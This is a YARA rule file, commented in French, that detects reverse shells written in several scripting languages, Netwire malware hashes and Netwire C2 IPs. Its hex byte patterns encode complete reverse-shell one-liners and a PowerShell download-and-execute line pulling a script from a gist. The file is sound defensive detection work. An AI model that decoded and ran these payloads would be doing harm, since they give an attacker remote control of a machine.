import "pe"
import "math"
import "hash"

rule Powershell 
{
	meta: 

		Action = "Envoi de l'invite de commande d'une machine cible sur une machine attaquante"

	strings:
		$Revshell1 = {70 6F 77 65 72 73 68 65 6C 6C 20 2D 4E 6F 50 20 2D 4E 6F 6E 49 20 2D 57 20 48 69 64 64 65 6E 20 2D 45 78 65 63 20 42 79 70 61 73 73 20 2D 43 6F 6D 6D 61 6E 64 20 4E 65 77 2D 4F 62 6A 65 63 74 20 53 79 73 74 65 6D 2E 4E 65 74 2E 53 6F 63 6B 65 74 73 2E 54 43 50 43 6C 69 65 6E 74 28 [10-17] 29 3B 24 73 74 72 65 61 6D 20 3D 20 24 63 6C 69 65 6E 74 2E 47 65 74 53 74 72 65 61 6D 28 29 3B 5B 62 79 74 65 5B 5D 5D 24 62 79 74 65 73 20 3D 20 30 2E 2E 36 35 35 33 35 7C 25 7B 30 7D 3B 77 68 69 6C 65 28 28 24 69 20 3D 20 24 73 74 72 65 61 6D 2E 52 65 61 64 28 24 62 79 74 65 73 2C 20 30 2C 20 24 62 79 74 65 73 2E 4C 65 6E 67 74 68 29 29 20 2D 6E 65 20 30 29 7B 3B 24 64 61 74 61 20 3D 20 28 4E 65 77 2D 4F 62 6A 65 63 74 20 2D 54 79 70 65 4E 61 6D 65 20 53 79 73 74 65 6D 2E 54 65 78 74 2E 41 53 43 49 49 45 6E 63 6F 64 69 6E 67 29 2E 47 65 74 53 74 72 69 6E 67 28 24 62 79 74 65 73 2C 30 2C 20 24 69 29 3B 24 73 65 6E 64 62 61 63 6B 20 3D 20 28 69 65 78 20 24 64 61 74 61 20 32 3E 26 31 20 7C 20 4F 75 74 2D 53 74 72 69 6E 67 20 29 3B 24 73 65 6E 64 62 61 63 6B 32 20 20 3D 20 24 73 65 6E 64 62 61 63 6B 20 2B 20 22 50 53 20 22 20 2B 20 28 70 77 64 29 2E 50 61 74 68 20 2B 20 22 3E 20 22 3B 24 73 65 6E 64 62 79 74 65 20 3D 20 28 5B 74 65 78 74 2E 65 6E 63 6F 64 69 6E 67 5D 3A 3A 41 53 43 49 49 29 2E 47 65 74 42 79 74 65 73 28 24 73 65 6E 64 62 61 63 6B 32 29 3B 24 73 74 72 65 61 6D 2E 57 72 69 74 65 28 24 73 65 6E 64 62 79 74 65 2C 30 2C 24 73 65 6E 64 62 79 74 65 2E 4C 65 6E 67 74 68 29 3B 24 73 74 72 65 61 6D 2E 46 6C 75 73 68 28 29 7D 3B 24 63 6C 69 65 6E 74 2E 43 6C 6F 73 65 28 29}
		$Revshell2 = {70 6F 77 65 72 73 68 65 6C 6C 20 2D 6E 6F 70 20 2D 63 20 22 24 63 6C 69 65 6E 74 20 3D 20 4E 65 77 2D 4F 62 6A 65 63 74 20 53 79 73 74 65 6D 2E 4E 65 74 2E 53 6F 63 6B 65 74 73 2E 54 43 50 43 6C 69 65 6E 74 28 [10 -17] 29 3B 24 73 74 72 65 61 6D 20 3D 20 24 63 6C 69 65 6E 74 2E 47 65 74 53 74 72 65 61 6D 28 29 3B 5B 62 79 74 65 5B 5D 5D 24 62 79 74 65 73 20 3D 20 30 2E 2E 36 35 35 33 35 7C 25 7B 30 7D 3B 77 68 69 6C 65 28 28 24 69 20 3D 20 24 73 74 72 65 61 6D 2E 52 65 61 64 28 24 62 79 74 65 73 2C 20 30 2C 20 24 62 79 74 65 73 2E 4C 65 6E 67 74 68 29 29 20 2D 6E 65 20 30 29 7B 3B 24 64 61 74 61 20 3D 20 28 4E 65 77 2D 4F 62 6A 65 63 74 20 2D 54 79 70 65 4E 61 6D 65 20 53 79 73 74 65 6D 2E 54 65 78 74 2E 41 53 43 49 49 45 6E 63 6F 64 69 6E 67 29 2E 47 65 74 53 74 72 69 6E 67 28 24 62 79 74 65 73 2C 30 2C 20 24 69 29 3B 24 73 65 6E 64 62 61 63 6B 20 3D 20 28 69 65 78 20 24 64 61 74 61 20 32 3E 26 31 20 7C 20 4F 75 74 2D 53 74 72 69 6E 67 20 29 3B 24 73 65 6E 64 62 61 63 6B 32 20 3D 20 24 73 65 6E 64 62 61 63 6B 20 2B 20 27 50 53 20 27 20 2B 20 28 70 77 64 29 2E 50 61 74 68 20 2B 20 27 3E 20 27 3B 24 73 65 6E 64 62 79 74 65 20 3D 20 28 5B 74 65 78 74 2E 65 6E 63 6F 64 69 6E 67 5D 3A 3A 41 53 43 49 49 29 2E 47 65 74 42 79 74 65 73 28 24 73 65 6E 64 62 61 63 6B 32 29 3B 24 73 74 72 65 61 6D 2E 57 72 69 74 65 28 24 73 65 6E 64 62 79 74 65 2C 30 2C 24 73 65 6E 64 62 79 74 65 2E 4C 65 6E 67 74 68 29 3B 24 73 74 72 65 61 6D 2E 46 6C 75 73 68 28 29 7D 3B 24 63 6C 69 65 6E 74 2E 43 6C 6F 73 65 28 29 22 }
		$RevshellDownload = {70 6F 77 65 72 73 68 65 6C 6C 20 49 45 58 20 28 4E 65 77 2D 4F 62 6A 65 63 74 20 4E 65 74 2E 57 65 62 43 6C 69 65 6E 74 29 2E 44 6F 77 6E 6C 6F 61 64 53 74 72 69 6E 67 28 27 68 74 74 70 73 3A 2F 2F 67 69 73 74 2E 67 69 74 68 75 62 75 73 65 72 63 6F 6E 74 65 6E 74 2E 63 6F 6D 2F 73 74 61 61 6C 64 72 61 61 64 2F 32 30 34 39 32 38 61 36 30 30 34 65 38 39 35 35 33 61 38 64 33 64 62 30 63 65 35 32 37 66 64 35 2F 72 61 77 2F 66 65 35 66 37 34 65 63 66 61 65 37 65 63 30 66 32 64 35 30 38 39 35 65 63 66 39 61 62 39 64 61 66 65 32 35 33 61 64 34 2F 6D 69 6E 69 2D 72 65 76 65 72 73 65 2E 70 73 31 27 29}

	condition:
		any of them
}

rule luashell
{
	meta: 

		Action = "Envoi de l'invite de commande d'une machine cible sur une machine attaquante"

	strings:
		$Revshell1 = {6C 75 61 35 2E 31 20 2D 65 20 27 6C 6F 63 61 6C 20 68 6F 73 74 2C 20 70 6F 72 74 20 3D 20 [10-17] 20 6C 6F 63 61 6C 20 73 6F 63 6B 65 74 20 3D 20 72 65 71 75 69 72 65 28 22 73 6F 63 6B 65 74 22 29 20 6C 6F 63 61 6C 20 74 63 70 20 3D 20 73 6F 63 6B 65 74 2E 74 63 70 28 29 20 6C 6F 63 61 6C 20 69 6F 20 3D 20 72 65 71 75 69 72 65 28 22 69 6F 22 29 20 74 63 70 3A 63 6F 6E 6E 65 63 74 28 68 6F 73 74 2C 20 70 6F 72 74 29 3B 20 77 68 69 6C 65 20 74 72 75 65 20 64 6F 20 6C 6F 63 61 6C 20 63 6D 64 2C 20 73 74 61 74 75 73 2C 20 70 61 72 74 69 61 6C 20 3D 20 74 63 70 3A 72 65 63 65 69 76 65 28 29 20 6C 6F 63 61 6C 20 66 20 3D 20 69 6F 2E 70 6F 70 65 6E 28 63 6D 64 2C 20 22 72 22 29 20 6C 6F 63 61 6C 20 73 20 3D 20 66 3A 72 65 61 64 28 22 2A 61 22 29 20 66 3A 63 6C 6F 73 65 28 29 20 74 63 70 3A 73 65 6E 64 28 73 29 20 69 66 20 73 74 61 74 75 73 20 3D 3D 20 22 63 6C 6F 73 65 64 22 20 74 68 65 6E 20 62 72 65 61 6B 20 65 6E 64 20 65 6E 64 20 74 63 70 3A 63 6C 6F 73 65 28 29 27}

	condition:
		any of them
}

rule Dartshell
{
	meta: 

		Action = "Envoi de l'invite de commande d'une machine cible sur une machine attaquante"

	strings:
		$SocketConnect = {53 6F 63 6B 65 74 2E 63 6F 6E 6E 65 63 74 28 [10-17] 29 2E 74 68 65 6E 28 28 73 6F 63 6B 65 74 29}
		$StartProcess = {20 50 72 6F 63 65 73 73 2E 73 74 61 72 74 28 27 70 6F 77 65 72 73 68 65 6C 6C 2E 65 78 65 27 2C 20 5B 5D 29}
		$encode = {2E 74 72 61 6E 73 66 6F 72 6D 28 75 74 66 38 2E 64 65 63 6F 64 65 72 29 }
		$waitresponse = {2E 6C 69 73 74 65 6E 28 28 6F 75 74 70 75 74 29 20 7B 20 73 6F 63 6B 65 74 2E 77 72 69 74 65 28 6F 75 74 70 75 74 29 3B 20 7D 29 3B }
	condition:
		$SocketConnect and $StartProcess or all of them
}

rule Perl
{
	meta:

		Action = "Envoi de l'invite de commande d'une machine cible sur une machine attaquante"

	strings:
		$a = {70 65 72 6C 20 2D 4D 49 4F 20 2D 65 20 27 24 63 3D 6E 65 77 20 49 4F 3A 3A 53 6F 63 6B 65 74 3A 3A 49 4E 45 54 28 50 65 65 72 41 64 64 72 2C 22 [10-17] 22 29 3B 53 54 44 49 4E 2D 3E 66 64 6F 70 65 6E 28 24 63 2C 72 29 3B 24 7E 2D 3E 66 64 6F 70 65 6E 28 24 63 2C 77 29 3B 73 79 73 74 65 6D 24 5F 20 77 68 69 6C 65 3C 3E 3B 27}
		$b = {70 65 72 6C 20 2D 4D 49 4F 20 2D 65 20 27 24 70 3D 66 6F 72 6B 3B 65 78 69 74 2C 69 66 28 24 70 29 3B 24 63 3D 6E 65 77 20 49 4F 3A 3A 53 6F 63 6B 65 74 3A 3A 49 4E 45 54 28 50 65 65 72 41 64 64 72 2C [10-17] 29 3B 53 54 44 49 4E 2D 3E 66 64 6F 70 65 6E 28 24 63 2C 72 29 3B 24 7E 2D 3E 66 64 6F 70 65 6E 28 24 63 2C 77 29 3B 73 79 73 74 65 6D 24 5F 20 77 68 69 6C 65 3C 3E 3B 27}

	condition:
		any of them
}

rule Python
{
	meta:

		Action = "Envoi de l'invite de commande d'une machine cible sur une machine attaquante"

	strings:
		$a = {70 79 74 68 6F 6E 2E 65 78 65 20 2D 63 20 22 28 6C 61 6D 62 64 61 20 5F 5F 79 2C 20 5F 5F 67 2C 20 5F 5F 63 6F 6E 74 65 78 74 6C 69 62 3A 20 5B 5B 5B 5B 5B 5B 5B 28 73 2E 63 6F 6E 6E 65 63 74 28 28 27 [10-17] 29 29 2C 20 5B 5B 5B 28 73 32 70 5F 74 68 72 65 61 64 2E 73 74 61 72 74 28 29 2C 20 5B 5B 28 70 32 73 5F 74 68 72 65 61 64 2E 73 74 61 72 74 28 29 2C 20 28 6C 61 6D 62 64 61 20 5F 5F 6F 75 74 3A 20 28 6C 61 6D 62 64 61 20 5F 5F 63 74 78 3A 20 5B 5F 5F 63 74 78 2E 5F 5F 65 6E 74 65 72 5F 5F 28 29 2C 20 5F 5F 63 74 78 2E 5F 5F 65 78 69 74 5F 5F 28 4E 6F 6E 65 2C 20 4E 6F 6E 65 2C 20 4E 6F 6E 65 29 2C 20 5F 5F 6F 75 74 5B 30 5D 28 6C 61 6D 62 64 61 3A 20 4E 6F 6E 65 29 5D 5B 32 5D 29 28 5F 5F 63 6F 6E 74 65 78 74 6C 69 62 2E 6E 65 73 74 65 64 28 74 79 70 65 28 27 65 78 63 65 70 74 27 2C 20 28 29 2C 20 7B 27 5F 5F 65 6E 74 65 72 5F 5F 27 3A 20 6C 61 6D 62 64 61 20 73 65 6C 66 3A 20 4E 6F 6E 65 2C 20 27 5F 5F 65 78 69 74 5F 5F 27 3A 20 6C 61 6D 62 64 61 20 5F 5F 73 65 6C 66 2C 20 5F 5F 65 78 63 74 79 70 65 2C 20 5F 5F 76 61 6C 75 65 2C 20 5F 5F 74 72 61 63 65 62 61 63 6B 3A 20 5F 5F 65 78 63 74 79 70 65 20 69 73 20 6E 6F 74 20 4E 6F 6E 65 20 61 6E 64 20 28 69 73 73 75 62 63 6C 61 73 73 28 5F 5F 65 78 63 74 79 70 65 2C 20 4B 65 79 62 6F 61 72 64 49 6E 74 65 72 72 75 70 74 29 20 61 6E 64 20 5B 54 72 75 65 20 66 6F 72 20 5F 5F 6F 75 74 5B 30 5D 20 69 6E 20 5B 28 28 73 2E 63 6C 6F 73 65 28 29 2C 20 6C 61 6D 62 64 61 20 61 66 74 65 72 3A 20 61 66 74 65 72 28 29 29 5B 31 5D 29 5D 5D 5B 30 5D 29 7D 29 28 29 2C 20 74 79 70 65 28 27 74 72 79 27 2C 20 28 29 2C 20 7B 27 5F 5F 65 6E 74 65 72 5F 5F 27 3A 20 6C 61 6D 62 64 61 20 73 65 6C 66 3A 20 4E 6F 6E 65 2C 20 27 5F 5F 65 78 69 74 5F 5F 27 3A 20 6C 61 6D 62 64 61 20 5F 5F 73 65 6C 66 2C 20 5F 5F 65 78 63 74 79 70 65 2C 20 5F 5F 76 61 6C 75 65 2C 20 5F 5F 74 72 61 63 65 62 61 63 6B 3A 20 5B 46 61 6C 73 65 20 66 6F 72 20 5F 5F 6F 75 74 5B 30 5D 20 69 6E 20 5B 28 28 70 2E 77 61 69 74 28 29 2C 20 28 6C 61 6D 62 64 61 20 5F 5F 61 66 74 65 72 3A 20 5F 5F 61 66 74 65 72 28 29 29 29 5B 31 5D 29 5D 5D 5B 30 5D 7D 29 28 29 29 29 29 28 5B 4E 6F 6E 65 5D 29 29 5B 31 5D 20 66 6F 72 20 70 32 73 5F 74 68 72 65 61 64 2E 64 61 65 6D 6F 6E 20 69 6E 20 5B 28 54 72 75 65 29 5D 5D 5B 30 5D 20 66 6F 72 20 5F 5F 67 5B 27 70 32 73 5F 74 68 72 65 61 64 27 5D 20 69 6E 20 5B 28 74 68 72 65 61 64 69 6E 67 2E 54 68 72 65 61 64 28 74 61 72 67 65 74 3D 70 32 73 2C 20 61 72 67 73 3D 5B 73 2C 20 70 5D 29 29 5D 5D 5B 30 5D 29 5B 31 5D 20 66 6F 72 20 73 32 70 5F 74 68 72 65 61 64 2E 64 61 65 6D 6F 6E 20 69 6E 20 5B 28 54 72 75 65 29 5D 5D 5B 30 5D 20 66 6F 72 20 5F 5F 67 5B 27 73 32 70 5F 74 68 72 65 61 64 27 5D 20 69 6E 20 5B 28 74 68 72 65 61 64 69 6E 67 2E 54 68 72 65 61 64 28 74 61 72 67 65 74 3D 73 32 70 2C 20 61 72 67 73 3D 5B 73 2C 20 70 5D 29 29 5D 5D 5B 30 5D 20 66 6F 72 20 5F 5F 67 5B 27 70 27 5D 20 69 6E 20 5B 28 73 75 62 70 72 6F 63 65 73 73 2E 50 6F 70 65 6E 28 5B 27 5C 5C 77 69 6E 64 6F 77 73 5C 5C 73 79 73 74 65 6D 33 32 5C 5C 63 6D 64 2E 65 78 65 27 5D 2C 20 73 74 64 6F 75 74 3D 73 75 62 70 72 6F 63 65 73 73 2E 50 49 50 45 2C 20 73 74 64 65 72 72 3D 73 75 62 70 72 6F 63 65 73 73 2E 53 54 44 4F 55 54 2C 20 73 74 64 69 6E 3D 73 75 62 70 72 6F 63 65 73 73 2E 50 49 50 45 29 29 5D 5D 5B 30 5D 29 5B 31 5D 20 66 6F 72 20 5F 5F 67 5B 27 73 27 5D 20 69 6E 20 5B 28 73 6F 63 6B 65 74 2E 73 6F 63 6B 65 74 28 73 6F 63 6B 65 74 2E 41 46 5F 49 4E 45 54 2C 20 73 6F 63 6B 65 74 2E 53 4F 43 4B 5F 53 54 52 45 41 4D 29 29 5D 5D 5B 30 5D 20 66 6F 72 20 5F 5F 67 5B 27 70 32 73 27 5D 2C 20 70 32 73 2E 5F 5F 6E 61 6D 65 5F 5F 20 69 6E 20 5B 28 6C 61 6D 62 64 61 20 73 2C 20 70 3A 20 28 6C 61 6D 62 64 61 20 5F 5F 6C 3A 20 5B 28 6C 61 6D 62 64 61 20 5F 5F 61 66 74 65 72 3A 20 5F 5F 79 28 6C 61 6D 62 64 61 20 5F 5F 74 68 69 73 3A 20 6C 61 6D 62 64 61 3A 20 28 5F 5F 6C 5B 27 73 27 5D 2E 73 65 6E 64 28 5F 5F 6C 5B 27 70 27 5D 2E 73 74 64 6F 75 74 2E 72 65 61 64 28 31 29 29 2C 20 5F 5F 74 68 69 73 28 29 29 5B 31 5D 20 69 66 20 54 72 75 65 20 65 6C 73 65 20 5F 5F 61 66 74 65 72 28 29 29 28 29 29 28 6C 61 6D 62 64 61 3A 20 4E 6F 6E 65 29 20 66 6F 72 20 5F 5F 6C 5B 27 73 27 5D 2C 20 5F 5F 6C 5B 27 70 27 5D 20 69 6E 20 5B 28 73 2C 20 70 29 5D 5D 5B 30 5D 29 28 7B 7D 29 2C 20 27 70 32 73 27 29 5D 5D 5B 30 5D 20 66 6F 72 20 5F 5F 67 5B 27 73 32 70 27 5D 2C 20 73 32 70 2E 5F 5F 6E 61 6D 65 5F 5F 20 69 6E 20 5B 28 6C 61 6D 62 64 61 20 73 2C 20 70 3A 20 28 6C 61 6D 62 64 61 20 5F 5F 6C 3A 20 5B 28 6C 61 6D 62 64 61 20 5F 5F 61 66 74 65 72 3A 20 5F 5F 79 28 6C 61 6D 62 64 61 20 5F 5F 74 68 69 73 3A 20 6C 61 6D 62 64 61 3A 20 5B 28 6C 61 6D 62 64 61 20 5F 5F 61 66 74 65 72 3A 20 28 5F 5F 6C 5B 27 70 27 5D 2E 73 74 64 69 6E 2E 77 72 69 74 65 28 5F 5F 6C 5B 27 64 61 74 61 27 5D 29 2C 20 5F 5F 61 66 74 65 72 28 29 29 5B 31 5D 20 69 66 20 28 6C 65 6E 28 5F 5F 6C 5B 27 64 61 74 61 27 5D 29 20 3E 20 30 29 20 65 6C 73 65 20 5F 5F 61 66 74 65 72 28 29 29 28 6C 61 6D 62 64 61 3A 20 5F 5F 74 68 69 73 28 29 29 20 66 6F 72 20 5F 5F 6C 5B 27 64 61 74 61 27 5D 20 69 6E 20 5B 28 5F 5F 6C 5B 27 73 27 5D 2E 72 65 63 76 28 31 30 32 34 29 29 5D 5D 5B 30 5D 20 69 66 20 54 72 75 65 20 65 6C 73 65 20 5F 5F 61 66 74 65 72 28 29 29 28 29 29 28 6C 61 6D 62 64 61 3A 20 4E 6F 6E 65 29 20 66 6F 72 20 5F 5F 6C 5B 27 73 27 5D 2C 20 5F 5F 6C 5B 27 70 27 5D 20 69 6E 20 5B 28 73 2C 20 70 29 5D 5D 5B 30 5D 29 28 7B 7D 29 2C 20 27 73 32 70 27 29 5D 5D 5B 30 5D 20 66 6F 72 20 5F 5F 67 5B 27 6F 73 27 5D 20 69 6E 20 5B 28 5F 5F 69 6D 70 6F 72 74 5F 5F 28 27 6F 73 27 2C 20 5F 5F 67 2C 20 5F 5F 67 29 29 5D 5D 5B 30 5D 20 66 6F 72 20 5F 5F 67 5B 27 73 6F 63 6B 65 74 27 5D 20 69 6E 20 5B 28 5F 5F 69 6D 70 6F 72 74 5F 5F 28 27 73 6F 63 6B 65 74 27 2C 20 5F 5F 67 2C 20 5F 5F 67 29 29 5D 5D 5B 30 5D 20 66 6F 72 20 5F 5F 67 5B 27 73 75 62 70 72 6F 63 65 73 73 27 5D 20 69 6E 20 5B 28 5F 5F 69 6D 70 6F 72 74 5F 5F 28 27 73 75 62 70 72 6F 63 65 73 73 27 2C 20 5F 5F 67 2C 20 5F 5F 67 29 29 5D 5D 5B 30 5D 20 66 6F 72 20 5F 5F 67 5B 27 74 68 72 65 61 64 69 6E 67 27 5D 20 69 6E 20 5B 28 5F 5F 69 6D 70 6F 72 74 5F 5F 28 27 74 68 72 65 61 64 69 6E 67 27 2C 20 5F 5F 67 2C 20 5F 5F 67 29 29 5D 5D 5B 30 5D 29 28 28 6C 61 6D 62 64 61 20 66 3A 20 28 6C 61 6D 62 64 61 20 78 3A 20 78 28 78 29 29 28 6C 61 6D 62 64 61 20 79 3A 20 66 28 6C 61 6D 62 64 61 3A 20 79 28 79 29 28 29 29 29 29 2C 20 67 6C 6F 62 61 6C 73 28 29 2C 20 5F 5F 69 6D 70 6F 72 74 5F 5F 28 27 63 6F 6E 74 65 78 74 6C 69 62 27 29 29 22 }
		$b = {70 79 74 68 6F 6E 2E 65 78 65 20 2D 63 20 22 69 6D 70 6F 72 74 20 73 6F 63 6B 65 74 2C 6F 73 2C 74 68 72 65 61 64 69 6E 67 2C 73 75 62 70 72 6F 63 65 73 73 20 61 73 20 73 70 3B 70 3D 73 70 2E 50 6F 70 65 6E 28 5B 27 63 6D 64 2E 65 78 65 27 5D 2C 73 74 64 69 6E 3D 73 70 2E 50 49 50 45 2C 73 74 64 6F 75 74 3D 73 70 2E 50 49 50 45 2C 73 74 64 65 72 72 3D 73 70 2E 53 54 44 4F 55 54 29 3B 73 3D 73 6F 63 6B 65 74 2E 73 6F 63 6B 65 74 28 29 3B 73 2E 63 6F 6E 6E 65 63 74 28 28 27 [10-17] 29 29 3B 74 68 72 65 61 64 69 6E 67 2E 54 68 72 65 61 64 28 74 61 72 67 65 74 3D 65 78 65 63 2C 61 72 67 73 3D 28 5C 22 77 68 69 6C 65 28 54 72 75 65 29 3A 6F 3D 6F 73 2E 72 65 61 64 28 70 2E 73 74 64 6F 75 74 2E 66 69 6C 65 6E 6F 28 29 2C 31 30 32 34 29 3B 73 2E 73 65 6E 64 28 6F 29 5C 22 2C 67 6C 6F 62 61 6C 73 28 29 29 2C 64 61 65 6D 6F 6E 3D 54 72 75 65 29 2E 73 74 61 72 74 28 29 3B 74 68 72 65 61 64 69 6E 67 2E 54 68 72 65 61 64 28 74 61 72 67 65 74 3D 65 78 65 63 2C 61 72 67 73 3D 28 5C 22 77 68 69 6C 65 28 54 72 75 65 29 3A 69 3D 73 2E 72 65 63 76 28 31 30 32 34 29 3B 6F 73 2E 77 72 69 74 65 28 70 2E 73 74 64 69 6E 2E 66 69 6C 65 6E 6F 28 29 2C 69 29 5C 22 2C 67 6C 6F 62 61 6C 73 28 29 29 29 2E 73 74 61 72 74 28 29 22 }
	condition:
		any of them
}

rule ruby
{
	meta:

		Action = "Envoi de l'invite de commande d'une machine cible sur une machine attaquante"

	strings:
		$a = {72 75 62 79 20 2D 72 73 6F 63 6B 65 74 20 2D 65 20 27 63 3D 54 43 50 53 6F 63 6B 65 74 2E 6E 65 77 28 22 [10-17] 22 29 3B 77 68 69 6C 65 28 63 6D 64 3D 63 2E 67 65 74 73 29 3B 49 4F 2E 70 6F 70 65 6E 28 63 6D 64 2C 22 72 22 29 7B 7C 69 6F 7C 63 2E 70 72 69 6E 74 20 69 6F 2E 72 65 61 64 7D 65 6E 64 27}

	condition:
		any of them
}

rule VBA1
{
	meta:

		Action = "Envoi de l'invite de commande d'une machine cible sur une machine attaquante"

	strings:
		$API1 = {50 72 69 76 61 74 65 20 44 65 63 6C 61 72 65 20 50 74 72 53 61 66 65 20 46 75 6E 63 74 69 6F 6E 20 43 72 65 61 74 65 50 72 6F 63 20 4C 69 62 20 22 6B 65 72 6E 65 6C 33 32 22 20 41 6C 69 61 73 20 22 43 72 65 61 74 65 50 72 6F 63 65 73 73 41 22 20 28 42 79 56 61 6C 20 6C 70 41 70 70 6C 69 63 61 74 69 6F 6E 4E 61 6D 65 20 41 73 20 53 74 72 69 6E 67 2C 20 42 79 56 61 6C 20 6C 70 43 6F 6D 6D 61 6E 64 4C 69 6E 65 20 41 73 20 53 74 72 69 6E 67 2C 20 42 79 56 61 6C 20 6C 70 50 72 6F 63 65 73 73 41 74 74 72 69 62 75 74 65 73 20 41 73 20 41 6E 79 2C 20 42 79 56 61 6C 20 6C 70 54 68 72 65 61 64 41 74 74 72 69 62 75 74 65 73 20 41 73 20 41 6E 79 2C 20 42 79 56 61 6C 20 62 49 6E 68 65 72 69 74 48 61 6E 64 6C 65 73 20 41 73 20 4C 6F 6E 67 2C 20 42 79 56 61 6C 20 64 77 43 72 65 61 74 69 6F 6E 46 6C 61 67 73 20 41 73 20 4C 6F 6E 67 2C 20 42 79 56 61 6C 20 6C 70 45 6E 76 69 72 6F 6E 6D 65 6E 74 20 41 73 20 4C 6F 6E 67 50 74 72 2C 20 42 79 56 61 6C 20 6C 70 43 75 72 72 65 6E 74 44 69 72 65 63 74 6F 72 79 20 41 73 20 53 74 72 69 6E 67 2C 20 6C 70 53 74 61 72 74 75 70 49 6E 66 6F 20 41 73 20 53 54 41 52 54 55 50 49 4E 46 4F 41 2C 20 6C 70 50 72 6F 63 65 73 73 49 6E 66 6F 72 6D 61 74 69 6F 6E 20 41 73 20 50 52 4F 43 45 53 53 5F 49 4E 46 4F 52 4D 41 54 49 4F 4E 29 20 41 73 20 4C 6F 6E 67 50 74 72 }
		//Importe the ProcessA Library depuis Kernel 32
		$API2 = {50 72 69 76 61 74 65 20 44 65 63 6C 61 72 65 20 50 74 72 53 61 66 65 20 46 75 6E 63 74 69 6F 6E 20 57 53 41 53 6F 63 6B 65 74 41 20 4C 69 62 20 22 77 73 32 5F 33 32 2E 64 6C 6C 22 20 28 42 79 56 61 6C 20 61 66 20 41 73 20 4C 6F 6E 67 2C 20 42 79 56 61 6C 20 74 20 41 73 20 4C 6F 6E 67 2C 20 42 79 56 61 6C 20 70 72 6F 74 6F 63 6F 6C 20 41 73 20 4C 6F 6E 67 2C 20 6C 70 50 72 6F 74 6F 63 6F 6C 49 6E 66 6F 20 41 73 20 41 6E 79 2C 20 42 79 56 61 6C 20 67 20 41 73 20 4C 6F 6E 67 2C 20 42 79 56 61 6C 20 64 77 46 6C 61 67 73 20 41 73 20 4C 6F 6E 67 29 20 41 73 20 4C 6F 6E 67 }
		// Importe WSAStartup depuis ws2_32.dll
		$API3 = {50 72 69 76 61 74 65 20 44 65 63 6C 61 72 65 20 50 74 72 53 61 66 65 20 46 75 6E 63 74 69 6F 6E 20 57 53 41 53 74 61 72 74 75 70 20 4C 69 62 20 22 77 73 32 5F 33 32 2E 64 6C 6C 22 20 28 42 79 56 61 6C 20 77 56 65 72 73 69 6F 6E 52 65 71 75 65 73 74 65 64 20 41 73 20 49 6E 74 65 67 65 72 2C 20 42 79 52 65 66 20 64 61 74 61 20 41 73 20 57 53 41 44 41 54 41 29 20 41 73 20 4C 6F 6E 67 }
		// Importe WSACleanup depuis ws2_32.dll
		$API4 = {50 72 69 76 61 74 65 20 44 65 63 6C 61 72 65 20 50 74 72 53 61 66 65 20 46 75 6E 63 74 69 6F 6E 20 47 65 74 41 64 64 72 49 6E 66 6F 20 4C 69 62 20 22 77 73 32 5F 33 32 2E 64 6C 6C 22 20 41 6C 69 61 73 20 22 67 65 74 61 64 64 72 69 6E 66 6F 22 20 28 42 79 56 61 6C 20 4E 6F 64 65 4E 61 6D 65 20 41 73 20 53 74 72 69 6E 67 2C 20 42 79 56 61 6C 20 53 65 72 76 4E 61 6D 65 20 41 73 20 53 74 72 69 6E 67 2C 20 42 79 56 61 6C 20 6C 70 48 69 6E 74 73 20 41 73 20 4C 6F 6E 67 50 74 72 2C 20 6C 70 52 65 73 75 6C 74 20 41 73 20 4C 6F 6E 67 50 74 72 29 20 41 73 20 4C 6F 6E 67}
		// Importe getaddrinfo 
		$IP = {43 6F 6E 73 74 20 69 70 20 3D 20 22 [10-12] 22 }
		$PORT = {43 6F 6E 73 74 20 70 6F 72 74 20 3D 20 22 [3-6] 22 }

	condition:
		all of them	
}


rule Netwirehash
{
	meta:
		Action = "Valeur de Hash pour des menaces connues"
	condition:
	hash.sha256(0, filesize) == "288719cc7ce53a7dc829be4a5d261e0c9229aca9097b72bea018fa7c9aa84000" or
	hash.sha256(0, filesize) == "f54b2f764ed7112c3a11adf056a54b8646f23093fbc52ce0e07a184f5dd69fcc" or
	hash.sha256(0, filesize) == "8d083280e9df85fab3c0f92c8ead02ac06a11da1db7e8966d2997fe8b3e417ab" or
	hash.sha256(0, filesize) == "f6459d8f040ba2d567035461a2475ee0aaa647ee7c7b83d24ec8385ef28aed90" or
	hash.sha256(0, filesize) == "9b69c34effa0bda4b3d14deeae93743267cdeac6a2501f2a44cbbe4ac6dcdce2" or
	hash.sha256(0, filesize) == "bbf315665776da8bbb6ee1e5c9bb651c29584fc2d6a0ed1fd9d9796ad5b58355" or
	hash.sha256(0, filesize) == "18488ef5acdcfa5380b2606f1459f9e9a8f186c6572084a48cfd59b197eff76b" or
	hash.sha256(0, filesize) == "f7c22d1ac8bd67e0423dfd4929eb1dcebada6e32a573c6228171e7bef2c2b76b" or
	hash.sha256(0, filesize) == "fd2bcc3631d4ba173c1da493b6bbe084c7e2ddb10356e06ef5b7d782f3c403dc" or
	hash.sha256(0, filesize) == "0223813f145061b2f72575be4d6dfa4888d41e7c5dd5d64fc577de9cf4b340b2" or
	hash.sha256(0, filesize) == "4aee6fa588692eb4735fbe7f13c643daefc23a10a0a64820e1d307501c548c55" or
	hash.sha256(0, filesize) == "2e2472ca9ff77b5bca5383f823f2c6c883eee37877b12982f8638b11d7fbaad8" or
	hash.sha256(0, filesize) == "d0e2fe56dee098f43255dadd8829611d9b1280291acaea5cf49e6f39b5884c0f" or
	hash.sha256(0, filesize) == "7231c7a76d9c4d0a307197522a2aec968f31865a4b2c4b962b64b01e9229315b" or
	hash.sha256(0, filesize) == "989e6368643877ecefdfde9cf0c098c6aaf5c1bd242789b0274590fa325037b6" or
	hash.sha256(0, filesize) == "553f74bd9189509de5e5e143e2995ee60003cfc95cda9a9f69ceabb2240f7f4b" or
	hash.sha256(0, filesize) == "cc711478aa7c6da48d20f282120ed5c98ac166dd295cbb065cda903b0371ff28" or
	hash.sha256(0, filesize) == "092e7c3730ffc7247c77edb1386dc02568620d81b74f8b5f4c13a681e6cd087b" or
	hash.sha256(0, filesize) == "c3f9a1eb3e410e4f3576a1d832a7c7a530cdc8faa73681e3063e785e1ce0e086" or
	hash.sha256(0, filesize) == "51d4827a603217309dbee2a17b72ef329f0f64a3583ed69e19d0ca2e4795c81f" 
}

rule Netwire 
{
	meta:
		description = "Envoi de l'invite de commande d'une machine cible sur une machine attaquante"
	strings:
	 	$IP1 = "185.82.202.154"
		$IP2 = "178.159.4.20"
		$IP3 = "212.193.30.230"
		$IP4 = "67.215.9.235"
		$IP5 = "88.150.189.103"
		$IP6 = "185.81.157.169"
		$IP7 = "154.16.93.178"
		$IP8 = "193.124.0.151"
		$IP9 = "178.32.72.136"
		$IP10 = "213.152.162.170"
